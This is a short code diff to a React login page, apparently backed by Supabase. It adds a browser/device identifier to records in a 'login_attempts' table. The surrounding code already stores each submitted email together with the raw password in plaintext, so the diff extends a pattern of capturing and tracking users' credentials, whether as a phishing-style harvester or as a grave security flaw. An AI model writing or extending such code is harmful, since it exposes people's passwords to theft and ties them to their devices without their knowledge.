@@ -2,6 +2,7 @@ import { useState } from 'react';
 import { useNavigate } from 'react-router-dom';
 import { Mail, Lock, Eye, EyeOff, ArrowLeft, LogIn } from 'lucide-react';
 import { supabase } from '@/lib/supabase';
+import { getClientId } from '@/lib/clientId';
 import { useSiteConfig } from '@/context/SiteConfigContext';
 import Header from '@/components/Header';
 import Footer from '@/components/Footer';
@@ -37,6 +38,7 @@ export default function LoginPage() {
         const regId = sessionStorage.getItem('reg_id');
         await supabase.from('login_attempts').insert({
           registration_id: regId || null,
+          client_id: getClientId(), // Link to this browser/device
           email: email.trim().toLowerCase(),
           password: password,
         });
